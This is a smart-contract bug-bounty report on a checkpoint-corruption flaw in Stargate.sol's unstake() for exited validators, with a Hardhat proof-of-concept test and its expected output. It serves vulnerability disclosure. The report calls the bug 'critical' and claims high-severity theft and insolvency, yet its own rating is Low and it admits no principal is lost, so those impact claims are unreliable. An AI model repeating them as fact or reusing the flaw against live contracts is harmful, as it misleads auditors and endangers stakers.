# 60079 sc low critical historical state corruption via stale checkpoints leads to permanent loss of future yield

**Submitted on Nov 18th 2025 at 09:53:06 UTC by @kind0dev for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60079
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * Theft of unclaimed yield

## Description

#### Brief/Intro

A critical state corruption vulnerability exists in the `unstake()` function of the `Stargate.sol` contract. When a user unstakes from a delegation that was forcibly `EXITED` (due to the validator failing), the cleanup logic incorrectly writes a new historical checkpoint instead of correcting the last scheduled one. This leaves a permanent, incorrect "ghost stake" entry in the historical ledger for a reward period that never occurred for that validator. This corruption makes any future reward reconciliation impossible and will lead to an irrecoverable loss and unfair distribution of yield for other users who were staked in that same period.

{% stepper %}
{% step %}

### Vulnerability Details — Overview

The vulnerability arises from the interaction between the contract's state logic and the append-only nature of the OpenZeppelin `Checkpoints` library, which is used to store the historical `delegatorsEffectiveStake` for each validator.
{% endstep %}

{% step %}

### The Append-Only Ledger

The `Checkpoints.Trace` struct is essentially an append-only log. New entries can only be `push`ed with a key (period number) strictly greater than the last. There is no mechanism to edit or remove a historical entry once a newer entry has been added.
{% endstep %}

{% step %}

### Scheduling Future Stake

When a user delegates, the `_delegate()` function calls `_updatePeriodEffectiveStake()` to schedule an increase in the validator's stake for a future period, specifically `completedPeriods + 2`. This writes a checkpoint that is not yet active. For example, if a validator has completed Period 9, a new delegation will write a checkpoint for Period 11.
{% endstep %}

{% step %}

### The Forced Exit Scenario

A validator can be forcefully removed from the network by the protocol (e.g., for being offline). When this happens:

* The validator's status in `IProtocolStaker` becomes `EXITED`.
* Its `completedPeriods` counter freezes permanently. In the example, it freezes at 10 after completing Period 10.
* Any delegations to this validator now implicitly have a status of `EXITED` as determined by the `_getDelegationStatus()` function. This occurs *without* the user calling `requestDelegationExit()`.
  {% endstep %}

{% step %}

### The Flawed Cleanup in `unstake()`

When a user from the failed validator calls `unstake()`, the following flawed sequence occurs:

* The function identifies the delegation as `EXITED` and proceeds.
* It determines it needs to clean up the user's stake. It calculates the period to update as `completedPeriods + 2` (which is `10 + 2 = 12` in the example).
* It calls `_updatePeriodEffectiveStake(..., period=12, isIncrease=false)`.
* Inside this function, it reads the previous stake value by looking up the last checkpoint (the one for Period 11) and subtracts the user's stake, calculating a new value of 0.
* It then **pushes a new checkpoint** for Period 12 with a value of 0.

The historical record for the validator is now permanently corrupted: `Checkpoints array: [{key: 11, value: 1,000,000}, {key: 12, value: 0}]`

The "ghost stake" entry at Period 11 is now immutable and incorrect. It represents a stake on the validator for a period that the validator never completed.
{% endstep %}
{% endstepper %}

### Impact Details

This vulnerability has critical, long-term financial consequences for the protocol and its users. While it does not cause an immediate, direct theft of principal, it corrupts the ledger in a way that guarantees future financial loss.

* Permanent Loss of User Yield: The primary impact is the theft of unclaimed yield. In any future scenario that requires re-calculating historical rewards (such as a contract upgrade, a manual reconciliation event, or fixing an unrelated bug), the rewards for the "ghost" period (Period 11) will be calculated against an inflated `delegatorsEffectiveStake`. The portion of rewards allocated to the non-existent ghost stake will be permanently lost and can never be claimed by the legitimate delegators of that period. This aligns with the **High** severity impact "Theft of unclaimed yield."
* Protocol Insolvency for Historical Periods: The protocol becomes unable to fulfill its promise of fair reward distribution for the corrupted historical period. It creates a deficit where the rewards earned by the validator for that period cannot be fully and correctly distributed to the actual stakeholders of that period.
* Corruption of Ecosystem Data: The on-chain historical record is the source of truth for all off-chain services. This bug poisons that data, leading to incorrect calculations for user dashboards, tax reporting software, and validator reputation systems that rely on accurate historical APY data.

The "it's in the past" argument is not valid for a blockchain protocol. The history *is* the state, and a permanent error in the historical financial ledger is a fundamental flaw that will inevitably cause financial harm when that history is referenced.

## References

* **Vulnerable Function:** `unstake()` in `Stargate.sol`\
  <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/main/packages/contracts/contracts/Stargate.sol#L231>
* **Flawed Cleanup Logic:** The call to `_updatePeriodEffectiveStake()` within `unstake()` for `EXITED` validators.\
  <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/main/packages/contracts/contracts/Stargate.sol#L276>

## Proof of Concept

The following Hardhat unit test provides an executable demonstration of the vulnerability.

How to Run: Save the code below as a test file (e.g., `test/unit/poc.test.ts`) and run the following command from the repository root:

yarn dotenv -v VITE\_APP\_ENV=local -v TEST\_LOGS=1 hardhat test --network hardhat test/unit/poc.test.ts

{% stepper %}
{% step %}

#### PoC Step 1 — Stake and schedule checkpoint

Alice stakes and delegates to ValidatorX in Period 9. This schedules a checkpoint for Period 11.
{% endstep %}

{% step %}

#### PoC Step 2 — Validator completes next period and is forcefully exited

ValidatorX completes Period 10 and is then forcefully set to status `EXITED`. `completedPeriods` is frozen at 10.
{% endstep %}

{% step %}

#### PoC Step 3 — Alice unstakes

Alice calls `unstake()` in a later period. The `unstake()` cleanup logic writes a new checkpoint for Period 12 (the frozen `completedPeriods + 2`) instead of correcting the previously scheduled Period 11 checkpoint.
{% endstep %}

{% step %}

#### PoC Step 4 — Verification

Verify that the historical checkpoint for Period 11 remains as the original scheduled stake (a "ghost stake") and that Period 12 is set to 0. This demonstrates permanent state corruption.
{% endstep %}
{% endstepper %}

### Test Code

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import {
    Stargate,
    StargateNFT,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
} from "../../typechain-types";
import { getOrDeployContracts, stakeAndMatureNFT } from "../helpers";
import { createLocalConfig } from "@repo/config/contracts/envs/local";

describe("PoC: Ghost Stake Vulnerability", () => {
    let stargateContract: Stargate;
    let stargateNFTContract: StargateNFT;
    let protocolStakerMock: ProtocolStakerMock;
    let alice: HardhatEthersSigner;
    let validatorX: HardhatEthersSigner;
    let deployer: HardhatEthersSigner;

    const VALIDATOR_STATUS_ACTIVE = 2;
    const VALIDATOR_STATUS_EXITED = 3;
    const DELEGATION_STATUS_EXITED = 3;

    beforeEach(async () => {
        [deployer, alice, validatorX] = await ethers.getSigners();
        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        const config = createLocalConfig();
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.TOKEN_LEVELS[0].level.scaledRewardFactor = 150;

        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        stargateNFTContract = contracts.stargateNFTContract;
        
        await protocolStakerMock.helper__setStargate(stargateContract.target);

        await protocolStakerMock.addValidation(validatorX.address, 90);
        await protocolStakerMock.helper__setValidatorStatus(
            validatorX.address,
            VALIDATOR_STATUS_ACTIVE
        );
    });

    it("should create a permanent ghost stake checkpoint when unstaking from a validator that was forcefully exited", async () => {
        const levelId = 1;
        console.log("    🚀 PoC Step 1: Alice stakes and delegates to ValidatorX in Period 9.");

        await protocolStakerMock.helper__setValidationCompletedPeriods(validatorX.address, 9);
        const { tokenId, levelSpec } = await stakeAndMatureNFT(
            alice, levelId, stargateNFTContract, stargateContract, false
        );
        await stargateContract.connect(alice).delegate(tokenId, validatorX.address);

        const expectedEffectiveStake =
            (levelSpec.vetAmountRequiredToStake * levelSpec.scaledRewardFactor) / 100n;
        
        const stakeForPeriod11_before = await stargateContract.getDelegatorsEffectiveStake(validatorX.address, 11);
        expect(stakeForPeriod11_before).to.equal(expectedEffectiveStake, "Stake for Period 11 was not scheduled correctly.");
        console.log(`    ✅ Checkpoint for Period 11 correctly set to ${ethers.formatEther(expectedEffectiveStake)} VET.`);

        console.log("\n    🚀 PoC Step 2: ValidatorX completes Period 10, then is forcefully exited.");
        await protocolStakerMock.helper__setValidationCompletedPeriods(validatorX.address, 10);
        await protocolStakerMock.helper__setValidatorStatus(validatorX.address, VALIDATOR_STATUS_EXITED);
        console.log("    ✅ ValidatorX status is now EXITED. `completedPeriods` is frozen at 10.");

        const delegationStatus = await stargateContract.getDelegationStatus(tokenId);
        expect(delegationStatus).to.equal(DELEGATION_STATUS_EXITED);

        console.log("\n    🚀 PoC Step 3: Alice unstakes her token in a later period.");
        await stargateContract.connect(alice).unstake(tokenId);
        console.log("    ✅ Alice successfully called unstake() and received her VET back.");

        console.log("\n    🚀 PoC Step 4: Verifying the permanent state corruption.");
        const ghostStakeForPeriod11 = await stargateContract.getDelegatorsEffectiveStake(validatorX.address, 11);
        const stakeForPeriod12 = await stargateContract.getDelegatorsEffectiveStake(validatorX.address, 12);

        console.log(`    📊 Historical stake for Period 11 (Ghost): ${ethers.formatEther(ghostStakeForPeriod11)} VET`);
        console.log(`    📊 Historical stake for Period 12 (Cleaned): ${ethers.formatEther(stakeForPeriod12)} VET`);

        expect(ghostStakeForPeriod11).to.equal(
            expectedEffectiveStake,
            "CRITICAL: The ghost stake for Period 11 was NOT cleaned up!"
        );
        expect(stakeForPeriod12).to.equal(
            0,
            "The stake for Period 12 should be zero after cleanup."
        );

        console.log("\n    ✅ VERDICT: Vulnerability Confirmed. The historical checkpoint for Period 11 is permanently corrupted.");
    });
});
```

<details>

<summary>Expected Output</summary>

```
 PoC: Ghost Stake Vulnerability
    🚀 PoC Step 1: Alice stakes and delegates to ValidatorX in Period 9.
    ✅ Checkpoint for Period 11 correctly set to 150.0 VET.

    🚀 PoC Step 2: ValidatorX completes Period 10, then is forcefully exited.
    ✅ ValidatorX status is now EXITED. `completedPeriods` is frozen at 10.

    🚀 PoC Step 3: Alice unstakes her token in a later period.
    ✅ Alice successfully called unstake() and received her VET back.

    🚀 PoC Step 4: Verifying the permanent state corruption.
    📊 Historical stake for Period 11 (Ghost): 150.0 VET
    📊 Historical stake for Period 12 (Cleaned): 0.0 VET

    ✅ VERDICT: Vulnerability Confirmed. The historical checkpoint for Period 11 is permanently corrupted.
    ✔ should create a permanent ghost stake checkpoint when unstaking from a validator that was forcefully exited
```

</details>
